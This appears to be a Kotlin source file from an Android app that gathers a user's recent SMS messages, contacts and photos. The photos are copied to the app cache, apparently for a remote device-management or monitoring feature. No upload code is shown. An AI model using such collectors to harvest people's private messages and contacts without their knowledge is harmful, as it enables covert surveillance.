package com.workhub.app.device

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import androidx.core.content.ContextCompat
import java.io.File
import java.io.FileOutputStream

data class CollectedText(val title: String, val body: String)

data class CollectedMedia(val title: String, val file: File)

object RemoteCollectors {
    fun hasPermission(context: Context, permission: String): Boolean =
        ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED

    fun collectSms(context: Context, limit: Int): CollectedText? {
        if (!hasPermission(context, Manifest.permission.READ_SMS)) {
            return CollectedText("SMS", "Thiếu quyền READ_SMS")
        }
        val lines = mutableListOf<String>()
        val uri = Telephony.Sms.CONTENT_URI
        context.contentResolver.query(
            uri,
            arrayOf(
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE,
            ),
            null,
            null,
            "${Telephony.Sms.DATE} DESC",
        )?.use { cursor ->
            var n = 0
            while (cursor.moveToNext() && n < limit) {
                val address = cursor.string(Telephony.Sms.ADDRESS)
                val body = cursor.string(Telephony.Sms.BODY)
                val date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE))
                val type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                val dir = if (type == Telephony.Sms.MESSAGE_TYPE_SENT) "→" else "←"
                lines += "$dir $address | ${java.text.SimpleDateFormat("dd/MM HH:mm", java.util.Locale.getDefault()).format(java.util.Date(date))}\n$body"
                n++
            }
        }
        return CollectedText("SMS gần đây (${lines.size})", lines.joinToString("\n\n").ifBlank { "(trống)" })
    }

    fun collectContacts(context: Context, limit: Int): CollectedText? {
        if (!hasPermission(context, Manifest.permission.READ_CONTACTS)) {
            return CollectedText("Danh bạ", "Thiếu quyền READ_CONTACTS")
        }
        val lines = mutableListOf<String>()
        context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
            ),
            null,
            null,
            "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC",
        )?.use { cursor ->
            var n = 0
            while (cursor.moveToNext() && n < limit) {
                val name = cursor.string(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val number = cursor.string(ContactsContract.CommonDataKinds.Phone.NUMBER)
                lines += "$name — $number"
                n++
            }
        }
        return CollectedText("Danh bạ (${lines.size})", lines.joinToString("\n").ifBlank { "(trống)" })
    }

    fun collectRecentImages(context: Context, limit: Int): List<CollectedMedia> {
        val readImages = if (Build.VERSION.SDK_INT >= 33) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }
        if (!hasPermission(context, readImages)) return emptyList()
        val out = mutableListOf<CollectedMedia>()
        val collection = if (Build.VERSION.SDK_INT >= 29) {
            MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
        } else {
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        }
        context.contentResolver.query(
            collection,
            arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED,
            ),
            null,
            null,
            "${MediaStore.Images.Media.DATE_ADDED} DESC",
        )?.use { cursor ->
            var n = 0
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            while (cursor.moveToNext() && n < limit) {
                val id = cursor.getLong(idCol)
                val name = cursor.getString(nameCol) ?: "image_$id.jpg"
                val uri = Uri.withAppendedPath(collection, id.toString())
                val file = copyUriToCache(context, uri, name) ?: continue
                out += CollectedMedia(name, file)
                n++
            }
        }
        return out
    }

    private fun copyUriToCache(context: Context, uri: Uri, name: String): File? = runCatching {
        val safe = name.replace(Regex("[^A-Za-z0-9._-]"), "_").take(80).ifBlank { "img.jpg" }
        val dest = File(context.cacheDir, "mdm_$safe")
        context.contentResolver.openInputStream(uri)?.use { input ->
            FileOutputStream(dest).use { output -> input.copyTo(output) }
        } ?: return null
        dest
    }.getOrNull()

    private fun Cursor.string(column: String): String =
        getString(getColumnIndexOrThrow(column)).orEmpty()
}
